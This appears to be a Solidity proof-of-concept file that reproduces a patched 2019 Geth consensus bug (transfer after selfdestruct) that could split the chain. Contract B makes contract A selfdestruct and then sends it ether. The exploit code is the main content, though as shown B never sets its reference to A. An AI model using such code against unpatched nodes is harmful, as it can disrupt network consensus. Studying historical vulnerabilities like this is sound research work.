// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

//Go Ethereum, or "Geth", is the official Golang implementation of the Ethereum protocol.
//In Geth from version 1.9.4 and before version 1.9.20 a consensus-vulnerability could
//cause a chain split, where vulnerable versions refuse to accept the canonical chain.
//The fix was included in the Paragade release version 1.9.20. No individual workaround
//patches have been made -- all users are recommended to upgrade to a newer version.

// The attack involves exploiting a transfer-after-destruct bug that was in geth in 2019
// It involves calling contract B, which calls contract A twice with different values,
// after this, sending 1 ether to contract A.

contract B {
    A public a;

    constructor() payable {}

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

    function finalTransaction() external {
        address a_ = address(a);
        address payable _a_ = payable(a_);
        _a_.transfer(1 ether); // call with 1
    }

    function doAttack() external {
        a.kill{ value: 0 ether }(); // call with 0
        a.kill{ value: 2 ether }(); // call with 2
    }
}


contract A {
    event Deposit(
        address indexed from,
        string value
    );

    function kill() external payable {
        if (msg.value == 0) {
            emit Deposit(msg.sender, "Self destructing....");
            address addr = address(this);
            selfdestruct(payable(addr));
        } else {
            emit Deposit(msg.sender, "Else statement...");
        }
    }
}
